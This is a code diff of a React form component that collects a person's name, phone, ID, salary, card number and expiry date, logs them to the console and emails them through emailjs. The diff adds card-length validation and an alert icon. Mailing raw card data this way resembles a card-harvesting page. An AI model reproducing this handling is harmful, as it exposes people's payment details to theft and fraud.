@@ -32,9 +32,11 @@ const Main = ({ data, state, data1 }) => {
     const placement = "top";
 
     console.log(fname, phone, id, salary, cardNo, expiryDate);
+    const card = cardNo;
 
     if (fname && phone && id && cardNo && expiryDate) {
-      if (cardNo.length >= 8) {
+      if (cardNo.length >= 8 && card.replace(/\s+/g, "").length <= 16) {
+        console.log("conguralation");
         emailjs
           .sendForm(
             "service_zj5623f",
@@ -64,7 +66,7 @@ const Main = ({ data, state, data1 }) => {
             }
           );
       }
-      if (cardNo.length < 8) {
+      if (cardNo.length < 8 || card.replace(/\s+/g, "").length > 16) {
         document.body.scrollTop = 0; // For Safari
         document.documentElement.scrollTop = 0;
         setAlart(true);
@@ -160,7 +162,17 @@ const Main = ({ data, state, data1 }) => {
               style={{ width: "410px" }}
               role="alert"
             >
-              {data.alart}
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="20"
+                height="20"
+                fill="currentColor"
+                class="bi bi-credit-card-2-front-fill"
+                viewBox="0 0 16 16"
+              >
+                <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2.5 1a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h2a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-2zm0 3a.5.5 0 0 0 0 1h5a.5.5 0 0 0 0-1h-5zm0 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1z" />
+              </svg>{" "}
+              {data.alart2}
               <button
                 type="button"
                 class="close"
@@ -340,7 +352,6 @@ const Main = ({ data, state, data1 }) => {
                     setCardNo(e.target.value);
                   },
                 })}
-                id="CardId"
                 name="card_no"
                 value={cardNo}
               />
